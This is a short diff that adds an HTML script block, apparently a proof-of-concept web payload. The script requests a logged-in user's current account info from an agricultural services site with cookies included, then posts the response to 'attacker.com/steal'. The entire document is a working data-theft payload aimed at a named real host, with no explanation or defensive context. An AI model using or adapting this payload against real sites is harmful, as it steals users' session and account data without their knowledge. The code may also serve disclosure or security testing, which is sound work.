@@ -1,0 +1,13 @@
+<script>
+fetch('https://smartplantstg.cm-agri.com//farmer-servicev1/farmer-gbt/login/getCurrentInfo', {
+    credentials: 'include'  
+})
+.then(res => res.json())
+.then(data => {
+ 
+    fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+});
+</script>
